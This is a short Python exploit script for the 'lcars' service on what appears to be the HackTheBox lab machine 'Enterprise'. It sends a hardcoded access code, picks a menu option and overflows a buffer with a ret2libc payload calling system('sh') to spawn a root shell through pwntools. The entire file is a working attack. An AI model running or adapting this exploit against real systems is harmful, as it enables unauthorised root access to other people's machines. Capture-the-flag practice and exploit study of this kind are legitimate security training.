#!/usr/bin/env python2

'''
Title: lcarsRoot.py
Description: Exploits the buffer overflow vulnerability on lcars service on Enterprise-HackTheBox and spawns a
             root shell to the attacker.
Application: lcars
Reference: https://pwnd-root.github.io/posts/enterprise-hackthebox/
Author: pwnd-root
'''

import struct
from pwn import *

RHOST = '10.10.10.61'
RPORT = 32812


def conv (num):
    return struct.pack ('<I', num)


payload = 'A' * 212
payload += conv (0xf7e4c060) # system()
payload += conv (0xf7e3faf0) # exit()
payload += conv (0xf7f6ddd5) # 'sh'

sess = remote (RHOST, RPORT)
sess.recvuntil ("Enter Bridge Access Code: ")
sess.sendline ("picarda1")
sess.recvuntil ("Waiting for input: ")
sess.sendline ("4")
sess.recvuntil ("Enter Security Override:")
sess.sendline (payload)
sess.interactive ()


